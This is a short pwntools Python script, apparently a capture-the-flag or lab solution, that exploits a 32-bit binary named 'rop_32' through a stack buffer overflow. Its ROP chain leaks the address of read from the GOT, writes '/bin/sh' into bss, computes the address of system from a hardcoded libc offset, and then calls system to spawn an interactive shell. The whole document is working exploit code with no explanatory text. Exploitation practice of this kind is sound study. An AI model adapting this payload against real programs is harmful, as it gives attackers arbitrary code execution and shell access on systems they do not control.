from pwn import *

p = process("./rop_32")

main = 0x08049221
p3r = 0x80492d1
bss = 0x804c024
write_plt = 0x80490a0
read_plt = 0x8049080
read_got = 0x804c00c

payload = b'A'*108
payload += p32(write_plt)
payload += p32(p3r)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
payload += p32(read_plt)
payload += p32(p3r)
payload += p32(0)
payload += p32(bss)
payload += p32(8)
payload += p32(main)

p.send(payload)
p.recv(5)

read_addr = u32(p.recv(4))
system = read_addr - 0xc0810

p.send(b"/bin/sh\x00")

payload = b'A'*108
payload += p32(system)
payload += b"B"*4
payload += p32(bss)

p.send(payload)


p.interactive()

